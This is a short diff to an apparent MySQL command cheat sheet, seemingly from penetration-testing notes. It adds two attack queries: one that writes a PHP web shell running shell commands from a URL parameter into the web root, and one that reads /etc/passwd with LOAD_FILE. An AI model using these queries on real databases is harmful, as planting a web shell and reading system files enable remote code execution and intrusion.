@@ -48,3 +48,5 @@ MySQL is an open-source SQL relational database management system developed and 
 - `show columns from <table>;`
 - `select * from <table>;`
 - `select * from <table> where <column> = "<string>";` Example:`select host, unique_users from host_summary;`
+- `SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';` write local files
+- `select LOAD_FILE("/etc/passwd");` read local files
